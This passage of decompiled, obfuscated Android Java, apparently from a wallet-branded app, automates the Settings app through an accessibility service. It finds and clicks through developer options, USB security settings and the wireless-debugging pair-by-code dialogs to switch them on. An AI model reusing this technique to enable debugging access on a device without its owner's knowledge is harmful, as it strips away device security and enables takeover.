               var10000 = var25;
               boolean var44 = false;
               break label219;
            }

            var2 = var1;

            try {
               var9.add(var36);
            } catch (Exception var24) {
               var10000 = var24;
               boolean var45 = false;
               break label219;
            }

            var2 = var1;

            try {
               MyAccessibilityService.I(var0);
            } catch (Exception var22) {
               var10000 = var22;
               boolean var46 = false;
               break label219;
            }

            while (var0 != null && var4 == null) {
               var2 = var1;

               try {
                  if (var6.incrementAndGet() > 3) {
                     break;
                  }
               } catch (Exception var23) {
                  var10000 = var23;
                  boolean var47 = false;
                  break label219;
               }

               var2 = var1;

               try {
                  var4 = var0.findOneByCombine(var7);
               } catch (Exception var21) {
                  var10000 = var21;
                  boolean var48 = false;
                  break label219;
               }

               var2 = var1;

               try {
                  var0 = var0.parent();
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var49 = false;
                  break label219;
               }
            }

            if (var4 == null) {
               break label215;
            }

            var2 = var1;

            try {
               Log.d("PairAccessibilityDelegate", "checkboxNode is not null");
            } catch (Exception var19) {
               var10000 = var19;
               boolean var50 = false;
               break label219;
            }

            var2 = var1;

            try {
               var6.set(0);
            } catch (Exception var18) {
               var10000 = var18;
               boolean var51 = false;
               break label219;
            }

            var2 = var1;

            try {
               var1 = var4.checked();
            } catch (Exception var17) {
               var10000 = var17;
               boolean var52 = false;
               break label219;
            }

            while (true) {
               var3 = var1;
               if (var1) {
                  break label215;
               }

               var2 = var1;
               var3 = var1;

               try {
                  if (var6.incrementAndGet() > 5) {
                     break label215;
                  }
               } catch (Exception var16) {
                  var10000 = var16;
                  boolean var53 = false;
                  break;
               }

               var2 = var1;

               try {
                  var4.click();
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var54 = false;
                  break;
               }

               var2 = var1;

               try {
                  Log.d("PairAccessibilityDelegate", "checkboxNode is click");
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var55 = false;
                  break;
               }

               var2 = var1;

               try {
                  var5.setClicked(true);
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var56 = false;
                  break;
               }

               var2 = var1;

               try {
                  com.guard.wallet.utils.g.T0(20);
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var57 = false;
                  break;
               }

               var2 = var1;

               try {
                  var4.refresh();
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var58 = false;
                  break;
               }

               var2 = var1;

               try {
                  var1 = var4.checked();
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var59 = false;
                  break;
               }
            }
         }

         Exception var34 = var10000;
         a1.q.s("PairAccessibilityDelegate", var34);
         var3 = var2;
      }

      var5.setChecked(var3);
      return var5;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static CheckedResult h0(UiObject var0) {
      CheckedResult var5;
      Exception var10000;
      label126: {
         UiObject var4;
         AtomicInteger var6;
         label122: {
            label121: {
               var6 = new AtomicInteger(0);
               var5 = new CheckedResult();
               if (var0 != null) {
                  try {
                     if (var0.checkable()) {
                        break label121;
                     }
                  } catch (Exception var16) {
                     var10000 = var16;
                     boolean var10001 = false;
                     break label126;
                  }
               }

               var4 = null;
               break label122;
            }

            var4 = var0;
         }

         CombineFilter var7;
         try {
            var7 = Q0();
            MyAccessibilityService.I(var0);
         } catch (Exception var14) {
            var10000 = var14;
            boolean var19 = false;
            break label126;
         }

         while (var0 != null && var4 == null) {
            try {
               if (var6.incrementAndGet() > 3) {
                  break;
               }

               var4 = var0.findOneByCombine(var7);
               var0 = var0.parent();
            } catch (Exception var15) {
               var10000 = var15;
               boolean var20 = false;
               break label126;
            }
         }

         if (var4 == null) {
            return var5;
         }

         boolean var3;
         try {
            var5.setChecked(var4.checked());
            var3 = var5.isChecked();
         } catch (Exception var13) {
            var10000 = var13;
            boolean var21 = false;
            break label126;
         }

         int var1;
         int var2 = 20;
         var1 = var2;
         label96:
         if (!var3) {
            var1 = var2;

            try {
               if (!var4.click()) {
                  break label96;
               }

               Log.d("PairAccessibilityDelegate", "switchNode clicked");
               var5.setClicked(true);
               var4.refresh();
               var5.setChecked(var4.checked());
            } catch (Exception var12) {
               var10000 = var12;
               boolean var22 = false;
               break label126;
            }

            while (true) {
               var1 = var2;
               if (var2 <= 0) {
                  break;
               }

               var1 = var2;

               try {
                  if (var5.isChecked()) {
                     break;
                  }

                  com.guard.wallet.utils.g.T0(1);
                  var4.refresh();
                  var5.setChecked(var4.checked());
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var23 = false;
                  break label126;
               }

               var2--;
            }
         }

         try {
            if (var5.isChecked() || var5.isClicked()) {
               return var5;
            }

            var0 = var4.findParentUtilCombine(T());
         } catch (Exception var10) {
            var10000 = var10;
            boolean var24 = false;
            break label126;
         }

         if (var0 == null) {
            return var5;
         }

         try {
            if (!var0.click()) {
               return var5;
            }

            var5.setClicked(true);
            var4.refresh();
            var5.setChecked(var4.checked());
         } catch (Exception var9) {
            var10000 = var9;
            boolean var25 = false;
            break label126;
         }

         while (true) {
            if (var1 <= 0) {
               return var5;
            }

            try {
               if (var5.isChecked()) {
                  return var5;
               }

               com.guard.wallet.utils.g.T0(1);
               var4.refresh();
               var5.setChecked(var4.checked());
            } catch (Exception var8) {
               var10000 = var8;
               boolean var26 = false;
               break;
            }

            var1--;
         }
      }

      Exception var18 = var10000;
      a1.q.s("PairAccessibilityDelegate", var18);
      return var5;
   }

   public static ListenWindow i0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(X());
      return var0;
   }

   public static ListenWindow j0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(Z());
      return var0;
   }

   public static ListenWindow k0() {
      CombineFilter var0 = V0();
      if (var0 != null) {
         ListenWindow var1 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(var0);
         var1.setEventTypes(new HashSet<>());
         o.b.q(32, var1.getEventTypes(), var1).add(16384);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow l0() {
      CombineFilter var0 = X0();
      if (var0 != null) {
         ListenWindow var1 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(var0);
         var1.setEventTypes(new HashSet<>());
         o.b.q(32, var1.getEventTypes(), var1).add(16384);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow m0() {
      CombineFilter var0 = V0();
      if (var0 != null) {
         ListenWindow var1 = new ListenWindow("com.android.settings", "com.hihonor.settingslib.SubSettings");
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(var0);
         var1.setEventTypes(new HashSet<>());
         o.b.q(32, var1.getEventTypes(), var1).add(16384);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow n0() {
      CombineFilter var0 = X0();
      if (var0 != null) {
         ListenWindow var1 = new ListenWindow("com.android.settings", "com.hihonor.settingslib.SubSettings");
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(var0);
         var1.setEventTypes(new HashSet<>());
         o.b.q(32, var1.getEventTypes(), var1).add(16384);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow o0() {
      ListenWindow var0 = new ListenWindow(null, null);
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(X());
      return var0;
   }

   public static ListenWindow p0() {
      ListenWindow var0 = new ListenWindow(null, null);
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(X());
      return var0;
   }

   public static CombineFilter q0() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = a.a.c(var1, "className", "android.widget.LinearLayout");
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static ListenWindow r0() {
      ListenWindow var0 = new ListenWindow("com.android.systemui", "miuix.appcompat.app.AlertDialog");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(1);
      return var0;
   }

   public static ListenWindow s0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.MiuiSettings");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      var0.getMatchs().add(Z());
      return var0;
   }

   public static boolean t0() {
      if (!com.guard.wallet.utils.e.i() && !com.guard.wallet.utils.e.m()) {
         return false;
      } else {
         Log.d("PairAccessibilityDelegate", "该手机需要进一步完成其他设置");
         return true;
      }
   }

   public static CombineFilter u0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVICE_USE_PAIR_CODE_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         var0.setStringConditions(new LinkedList<>());
         StringCondition var1 = new StringCondition();
         var1.setProperty("text");
         var1.setContains(com.guard.wallet.utils.f.b("PAIR_DEVICE_USE_PAIR_CODE_TEXT"));
         var0.getStringConditions().add(var1);
         return var0;
      } else {
         return null;
      }
   }

   public static ListenWindow v0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVICE_BY_CODE_2_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVICE_BY_CODE_2_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.setEventTypes(new HashSet<>());
         o.b.q(32, var2.getEventTypes(), var2).add(16384);
         return var2;
      } else {
         return null;
      }
   }

   public static ListenWindow w0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVICE_BY_CODE_3_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVICE_BY_CODE_3_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.setEventTypes(new HashSet<>());
         o.b.q(32, var2.getEventTypes(), var2).add(16384);
         return var2;
      } else {
         return null;
      }
   }

   public static ListenWindow x0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_DEVICE_BY_CODE_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_DEVICE_BY_CODE_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.setEventTypes(new HashSet<>());
         o.b.q(32, var2.getEventTypes(), var2).add(16384);
         return var2;
      } else {
         return null;
      }
   }

   public static ListenWindow y0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_FAILED_2_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_FAILED_2_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.getEventSubscribes().add(C0());
         return var2;
      } else {
         return null;
      }
   }

   public static ListenWindow z0() {
      CombineFilter var0;
      if (!a1.q.B(com.guard.wallet.utils.f.b("PAIR_FAILED_3_TEXT"))) {
         var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         o.b.v("PAIR_FAILED_3_TEXT", var1, var0, var1);
      } else {
         var0 = null;
      }

      if (var0 != null) {
         ListenWindow var2 = new ListenWindow("com.android.settings", null);
         var2.setMatchs(new LinkedList<>());
         var2.getMatchs().add(var0);
         var2.getEventSubscribes().add(C0());
         return var2;
      } else {
         return null;
      }
   }

   public final void D0() {
      try {
         if (!Objects.equals(this.p.get(), r.g.i)) {
            this.N0();
         }
      } catch (Exception var2) {
         a1.q.s("PairAccessibilityDelegate", var2);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final UiObject G0(UiObject var1) {
      UiObject var4 = null;
      UiObject var9 = null;

      UiObject var10;
      UiObject var11;
      UiObject var12;
      label266: {
         UiObject var2;
         UiObject var5;
         label271: {
            UiObject var7;
            AtomicInteger var13;
            try {
               var13 = new AtomicInteger(0);
               var1.refresh();
               Log.d("PairAccessibilityDelegate", "开始滚动查找无线调试栏目");
               var7 = var1.findOneByCombine(X0());
            } catch (Exception var42) {
               var43 = var42;
               var5 = null;
               var10 = null;
               var2 = var10;
               break label271;
            }

            UiObject var3;
            label272: {
               UiObject var6;
               UiObject var8;
               label260: {
                  label259: {
                     try {
                        var6 = var1.findOneByCombine(V0());
                     } catch (Exception var41) {
                        var43 = var41;
                        var3 = null;
                        break label259;
                     }

                     try {
                        var8 = var1.findOneByCombine(c0());
                        break label260;
                     } catch (Exception var40) {
                        var43 = var40;
                        var3 = var6;
                     }
                  }

                  var5 = null;
                  var2 = null;
                  var4 = var7;
                  break label272;
               }

               var4 = var7;
               var3 = var6;
               var2 = var8;

               Exception var10000;
               label273: {
                  try {
                     var5 = var1.findOneByCombine(d0());
                  } catch (Exception var36) {
                     var10000 = var36;
                     boolean var10001 = false;
                     break label273;
                  }

                  while (true) {
                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        if (!var1.canScrollForward()) {
                           break;
                        }
                     } catch (Exception var39) {
                        var10000 = var39;
                        boolean var46 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        if (var13.incrementAndGet() >= 10) {
                           break;
                        }
                     } catch (Exception var38) {
                        var10000 = var38;
                        boolean var47 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        Log.d("PairAccessibilityDelegate", "滚动视图可以向下滚动");
                     } catch (Exception var35) {
                        var10000 = var35;
                        boolean var48 = false;
                        break label273;
                     }

                     if (var7 != null || var6 != null || var8 != null || var5 != null) {
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        if (!var1.scrollForward()) {
                           continue;
                        }
                     } catch (Exception var37) {
                        var10000 = var37;
                        boolean var49 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        Log.d("PairAccessibilityDelegate", "向下滚动查找无线调试栏目");
                     } catch (Exception var34) {
                        var10000 = var34;
                        boolean var50 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        com.guard.wallet.utils.g.T0(10);
                     } catch (Exception var33) {
                        var10000 = var33;
                        boolean var51 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var1.refresh();
                     } catch (Exception var32) {
                        var10000 = var32;
                        boolean var52 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var7 = var1.findOneByCombine(X0());
                     } catch (Exception var31) {
                        var10000 = var31;
                        boolean var53 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var6 = var1.findOneByCombine(V0());
                     } catch (Exception var30) {
                        var10000 = var30;
                        boolean var54 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var8 = var1.findOneByCombine(c0());
                     } catch (Exception var29) {
                        var10000 = var29;
                        boolean var55 = false;
                        break label273;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var5 = var1.findOneByCombine(d0());
                     } catch (Exception var28) {
                        var10000 = var28;
                        boolean var56 = false;
                        break label273;
                     }
                  }

                  var9 = var5;
                  var4 = var7;
                  var3 = var6;
                  var2 = var8;

                  try {
                     var13.set(0);
                  } catch (Exception var27) {
                     var10000 = var27;
                     boolean var57 = false;
                     break label273;
                  }

                  var9 = var5;
                  var4 = var7;
                  var3 = var6;
                  var2 = var8;

                  UiObject var14;
                  try {
                     var14 = this.f0();
                  } catch (Exception var26) {
                     var10000 = var26;
                     boolean var58 = false;
                     break label273;
                  }

                  var12 = var5;
                  var11 = var7;
                  var10 = var6;
                  var1 = var8;
                  if (var14 == null) {
                     break label266;
                  }

                  while (true) {
                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;
                     var12 = var5;
                     var11 = var7;
                     var10 = var6;
                     var1 = var8;

                     try {
                        if (!var14.canScrollBackward()) {
                           break label266;
                        }
                     } catch (Exception var25) {
                        var10000 = var25;
                        boolean var59 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;
                     var12 = var5;
                     var11 = var7;
                     var10 = var6;
                     var1 = var8;

                     try {
                        if (var13.incrementAndGet() >= 10) {
                           break label266;
                        }
                     } catch (Exception var24) {
                        var10000 = var24;
                        boolean var60 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        Log.d("PairAccessibilityDelegate", "滚动视图可以向上滚动");
                     } catch (Exception var23) {
                        var10000 = var23;
                        boolean var61 = false;
                        break;
                     }

                     var12 = var5;
                     var11 = var7;
                     var10 = var6;
                     var1 = var8;
                     if (var7 != null) {
                        break label266;
                     }

                     var12 = var5;
                     var11 = var7;
                     var10 = var6;
                     var1 = var8;
                     if (var6 != null) {
                        break label266;
                     }

                     var12 = var5;
                     var11 = var7;
                     var10 = var6;
                     var1 = var8;
                     if (var8 != null) {
                        break label266;
                     }

                     if (var5 != null) {
                        var12 = var5;
                        var11 = var7;
                        var10 = var6;
                        var1 = var8;
                        break label266;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        if (!var14.scrollBackward()) {
                           continue;
                        }
                     } catch (Exception var22) {
                        var10000 = var22;
                        boolean var62 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        Log.d("PairAccessibilityDelegate", "向上滚动查找无线调试栏目");
                     } catch (Exception var21) {
                        var10000 = var21;
                        boolean var63 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        com.guard.wallet.utils.g.T0(10);
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var64 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var14.refresh();
                     } catch (Exception var19) {
                        var10000 = var19;
                        boolean var65 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var7 = var14.findOneByCombine(X0());
                     } catch (Exception var18) {
                        var10000 = var18;
                        boolean var66 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var6 = var14.findOneByCombine(V0());
                     } catch (Exception var17) {
                        var10000 = var17;
                        boolean var67 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var8 = var14.findOneByCombine(c0());
                     } catch (Exception var16) {
                        var10000 = var16;
                        boolean var68 = false;
                        break;
                     }

                     var9 = var5;
                     var4 = var7;
                     var3 = var6;
                     var2 = var8;

                     try {
                        var5 = var14.findOneByCombine(d0());
                     } catch (Exception var15) {
                        var10000 = var15;
                        boolean var69 = false;
                        break;
                     }
                  }
               }

               var43 = var10000;
               var5 = var9;
            }

            var10 = var3;
         }

         a1.q.s("PairAccessibilityDelegate", var43);
         var1 = var2;
         var11 = var4;
         var12 = var5;
      }

      if (var11 != null) {
         return var11;
      } else if (var10 != null) {
         return var10;
      } else {
         return var1 != null ? var1 : var12;
      }
   }

   public final boolean K() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(I());
         if (this.q(var1)) {
            Log.d("PairAccessibilityDelegate", "已进入允许开发者选项窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("PairAccessibilityDelegate", var2);
      }

      return false;
   }

   public final boolean L() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(Y());
         var1.add(W());
         var1.add(s0());
         var1.add(P0());
         var1.add(O0());
         var1.add(j0());
         var1.add(i0());
         if (this.q(var1)) {
            Log.d("PairAccessibilityDelegate", "已进入开发者、开发人员选项窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("PairAccessibilityDelegate", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean M() {
      Exception var10000;
      label60: {
         LinkedList var1;
         ListenWindow var2;
         try {
            var1 = new LinkedList();
            var2 = x0();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var10001 = false;
            break label60;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var13 = false;
               break label60;
            }
         }

         try {
            var2 = v0();
         } catch (Exception var7) {
            var10000 = var7;
            boolean var14 = false;
            break label60;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var15 = false;
               break label60;
            }
         }

         try {
            var2 = w0();
         } catch (Exception var5) {
            var10000 = var5;
            boolean var16 = false;
            break label60;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var17 = false;
               break label60;
            }
         }

         try {
            if (this.q(var1)) {
               Log.d("PairAccessibilityDelegate", "已进入使用配对码对话框");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var18 = false;
         }
      }

      Exception var10 = var10000;
      a1.q.s("PairAccessibilityDelegate", var10);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean N() {
      Exception var10000;
      label74: {
         LinkedList var1;
         ListenWindow var2;
         try {
            var1 = new LinkedList();
            var2 = B0();
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label74;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var16 = false;
               break label74;
            }
         }

         try {
            var2 = y0();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var17 = false;
            break label74;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var18 = false;
               break label74;
            }
         }

         try {
            var2 = z0();
         } catch (Exception var7) {
            var10000 = var7;
            boolean var19 = false;
            break label74;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var20 = false;
               break label74;
            }
         }

         try {
            var2 = A0();
         } catch (Exception var5) {
            var10000 = var5;
            boolean var21 = false;
            break label74;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var22 = false;
               break label74;
            }
         }

         try {
            if (this.q(var1)) {
               Log.d("PairAccessibilityDelegate", "已进入配对失败对话框");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var23 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("PairAccessibilityDelegate", var12);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void N0() {
      ReentrantLock var1 = this.q;
      if (var1.tryLock()) {
         AtomicBoolean var2 = this.r;

         label71: {
            Exception var10000;
            label77: {
               label78: {
                  label79: {
                     try {
                        if (var2.get()) {
                           break label71;
                        }

                        Log.d("PairAccessibilityDelegate", "准备结束本地配对自动化引擎");
                        var2.set(true);
                        com.guard.wallet.helper.g.h(100);
                        if (h.e.S() != null) {
                           Log.d("PairAccessibilityDelegate", "pairInFinish finishLocalAdbPair");
                           h.e.S().m.set(true);
                           if (e.b.c()) {
                              e.b.d();
                           }
                           break label79;
                        }
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var10001 = false;
                        break label77;
                     }

                     try {
                        if (e.b.c()) {
                           e.b.d();
                        }
                     } catch (Exception var7) {
                        var10000 = var7;
                        boolean var10 = false;
                        break label77;
                     }

                     try {
                        if (MyAccessibilityService.P() != null) {
                           Log.d("PairAccessibilityDelegate", "pairInFinish removePairAccessibilityDelegate");
                           MyAccessibilityService.P().u();
                           MyAccessibilityService.P().z();
                           MyAccessibilityService.P().B();
                        }
                        break label78;
                     } catch (Exception var5) {
                        var10000 = var5;
                        boolean var11 = false;
                        break label77;
                     }
                  }

                  try {
                     if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().u();
                        MyAccessibilityService.P().z();
                        MyAccessibilityService.P().B();
                     }
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var12 = false;
                     break label77;
                  }
               }

               try {
                  this.n.shutdownNow();
                  this.p.set(r.g.i);
                  com.guard.wallet.thread.l.a(super.c);
                  this.o.clear();
                  if (a1.q.M()) {
                     com.guard.wallet.utils.g.T0(5);
                  }
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var13 = false;
                  break label77;
               }

               try {
                  com.guard.wallet.helper.g.c();
                  Log.d("PairAccessibilityDelegate", "已结束本地配对自动化引擎");
                  super.d();
                  break label71;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var14 = false;
               }
            }

            Exception var9 = var10000;
            a1.q.s("PairAccessibilityDelegate", var9);
         }

         var1.unlock();
      }
   }

   public final boolean O() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(M0());
         if (this.q(var1)) {
            Log.d("PairAccessibilityDelegate", "已进入USB安全设置窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("PairAccessibilityDelegate", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean P() {
      Exception var10000;
      label102: {
         LinkedList var1;
         ListenWindow var2;
         try {
            var1 = new LinkedList();
            var2 = W0();
         } catch (Exception var15) {
            var10000 = var15;
            boolean var10001 = false;
            break label102;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var14) {
               var10000 = var14;
               boolean var22 = false;
               break label102;
            }
         }

         try {
            var2 = U0();
         } catch (Exception var13) {
            var10000 = var13;
            boolean var23 = false;
            break label102;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var12) {
               var10000 = var12;
               boolean var24 = false;
               break label102;
            }
         }

         try {
            var2 = l0();
         } catch (Exception var11) {
            var10000 = var11;
            boolean var25 = false;
            break label102;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var26 = false;
               break label102;
            }
         }

         try {
            var2 = k0();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var27 = false;
            break label102;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var28 = false;
               break label102;
            }
         }

         try {
            var2 = n0();
         } catch (Exception var7) {
            var10000 = var7;
            boolean var29 = false;
            break label102;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var30 = false;
               break label102;
            }
         }

         try {
            var2 = m0();
         } catch (Exception var5) {
            var10000 = var5;
            boolean var31 = false;
            break label102;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var32 = false;
               break label102;
            }
         }

         try {
            var1.add(Y0());
            if (this.q(var1)) {
               Log.d("PairAccessibilityDelegate", "已进入无线调试窗口");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var33 = false;
         }
      }

      Exception var16 = var10000;
      a1.q.s("PairAccessibilityDelegate", var16);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean Q() {
      Exception var10000;
      label46: {
         LinkedList var1;
         ListenWindow var2;
         try {
            var1 = new LinkedList();
            var2 = Y0();
         } catch (Exception var7) {
            var10000 = var7;
            boolean var10001 = false;
            break label46;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var10 = false;
               break label46;
            }
         }

         try {
            var2 = Z0();
         } catch (Exception var5) {
            var10000 = var5;
            boolean var11 = false;
            break label46;
         }

         if (var2 != null) {
            try {
               var1.add(var2);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var12 = false;
               break label46;
            }
         }

         try {
            if (this.q(var1)) {
               Log.d("PairAccessibilityDelegate", "已进入无线调试窗口(使用配对码配对)");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var13 = false;
         }
      }

      Exception var8 = var10000;
      a1.q.s("PairAccessibilityDelegate", var8);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
